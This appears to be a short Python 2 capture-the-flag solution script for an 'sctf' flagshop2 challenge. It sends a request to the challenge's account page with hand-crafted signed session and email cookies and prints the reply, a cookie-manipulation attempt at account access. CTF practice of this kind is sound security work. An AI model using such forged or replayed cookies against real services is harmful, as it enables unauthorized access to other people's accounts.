#!/usr/bin/env python

from pwn import *
import requests
import hackercodecs

url = 'http://flagshop2.problem.sctf.io/account'
cookies = dict(sid='s%3Aesq0r1cpjtahyeiotgoobhtgl.JRn8G%2FQAetDYyE%2F3Ez9Bkb56cJVL3GE0N0V7BSkd3GU'.decode('url'), email='s%3Aaaaaa%40a.com.x458b59QKK%2FOcf7Bpwr38f5sWXCCgCT52MZtY4VICFk')

r = requests.get(url, cookies=cookies)
print r.text
